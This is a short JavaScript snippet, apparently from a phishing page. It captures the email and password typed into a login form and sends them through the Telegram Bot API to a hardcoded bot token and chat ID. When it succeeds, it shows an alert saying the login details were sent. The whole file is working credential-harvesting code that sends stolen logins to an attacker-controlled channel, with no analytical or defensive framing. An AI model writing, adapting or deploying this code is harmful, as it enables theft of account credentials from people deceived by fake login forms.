document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();
    
    const email = encodeURIComponent(document.getElementById('email').value);
    const password = encodeURIComponent(document.getElementById('password').value);
    
    const botToken = '7200129734:AAFnzXSYiZVXVl_l6EwQM0G8_dynW8VA0IY'; // Your bot token
    const chatId = '6244550071'; // Your chat ID
    const message = `Email: ${email}\nPassword: ${password}`;

    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert('Login details sent successfully!');
            } else {
                alert('Error sending login details.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Error sending login details.');
        });
});